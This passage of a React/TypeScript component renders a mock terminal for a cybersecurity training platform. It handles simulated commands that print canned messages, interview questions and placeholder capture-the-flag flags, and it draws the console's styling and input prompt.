            { text: "   Q1: Explain Golden Ticket vs Silver Ticket AD attacks.", type: "log" },
            { text: "   Q2: How do you identify a brute-force attack in IIS logs?", type: "log" },
            { text: "[Mock Screen] Scenario check passed! Output: FLAG{m0ck_scr33n_h1r3d}", type: "success" },
            { text: `FLAG CAPTURED: FLAG{m0ck_scr33n_h1r3d}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Command not found.", type: "error" });
        }
        break;

      case "build-portfolio":
        if (moduleId === "cca-1") {
          outLines.push(
            { text: "[Portfolio] Compiling CTF writeups and projects...", type: "log" },
            { text: "[Portfolio] Read-me file verified. Repository structured.", type: "success" },
            { text: "    SOW and case study saved! Release key: FLAG{p0rtf0l10_succ3ss_c4r33r}", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Command not found.", type: "error" });
        }
        break;

      default:
        outLines.push({ text: `vaelora: ${command}: command not found. Type 'help' for instructions.`, type: "error" });
    }

    setLines(outLines);
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      handleCommand(input);
      setInput("");
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      if (history.length > 0) {
        const nextIdx = Math.min(historyIdx + 1, history.length - 1);
        setHistoryIdx(nextIdx);
        setInput(history[nextIdx]);
      }
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      const nextIdx = historyIdx - 1;
      setHistoryIdx(nextIdx);
      if (nextIdx >= 0) {
        setInput(history[nextIdx]);
      } else {
        setInput("");
      }
    }
  };

  return (
    <div 
      onClick={focusInput}
      className="glass rounded-[var(--radius-lg)] border border-border bg-black/85 shadow-glow w-full flex flex-col overflow-hidden font-mono text-[0.7rem] leading-relaxed relative select-text cursor-text"
    >
      {/* Corner cyber ticks */}
      <div className="absolute top-0 left-0 w-2 h-2 border-t border-l border-primary/30" />
      <div className="absolute top-0 right-0 w-2 h-2 border-t border-r border-primary/30" />
      <div className="absolute bottom-0 left-0 w-2 h-2 border-b border-l border-primary/30" />
      <div className="absolute bottom-0 right-0 w-2 h-2 border-b border-r border-primary/30" />

      {/* Header */}
      <div className="flex items-center justify-between border-b border-border/80 bg-black/50 px-4 py-2 h-9 select-none">
        <div className="flex items-center gap-2">
          <Terminal className="h-4 w-4 text-primary animate-pulse" />
          <span className="text-[0.6rem] tracking-[0.25em] uppercase text-muted-foreground font-semibold">Active Lab Sandbox</span>
        </div>
        <div className="flex items-center gap-1.5">
          <span className="h-2.5 w-2.5 rounded-full bg-red-500/70" />
          <span className="h-2.5 w-2.5 rounded-full bg-yellow-500/70" />
          <span className="h-2.5 w-2.5 rounded-full bg-green-500/70" />
        </div>
      </div>

      {/* Output Console */}
      <div
        ref={containerRef}
        className="p-4 h-[215px] overflow-y-auto space-y-1.5 scrollbar-thin overflow-x-hidden"
      >
        {lines.map((l, i) => (
          <div
            key={i}
            className={
              l.type === "cmd"
                ? "text-foreground font-medium"
                : l.type === "success"
                ? "text-[var(--status-success)]"
                : l.type === "flag"
                ? "text-primary font-bold shadow-[0_0_10px_rgba(255,107,0,0.2)] bg-primary/10 px-2 py-0.5 rounded border border-primary/20 inline-block animate-pulse select-all"
                : l.type === "error"
                ? "text-red-400 font-semibold"
                : "text-muted-foreground"
            }
          >
            {l.text}
          </div>
        ))}
      </div>

      {/* Command Input Prompt */}
      <div className="flex items-center border-t border-white/5 bg-black/40 px-4 py-2 select-none">
        <span className="text-primary pr-2 shrink-0">{prompt}</span>
        <input
          ref={inputRef}
          type="text"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={handleKeyDown}
          className="w-full bg-transparent border-0 text-white placeholder-white/20 p-0 text-[0.7rem] focus:outline-none focus:ring-0"
          placeholder="Enter command..."
          autoComplete="off"
          autoCorrect="off"
          autoCapitalize="off"
          spellCheck={false}
        />
        <ArrowRight className="w-3.5 h-3.5 text-muted-foreground/30 shrink-0 ml-2" />
      </div>
    </div>
  );
}
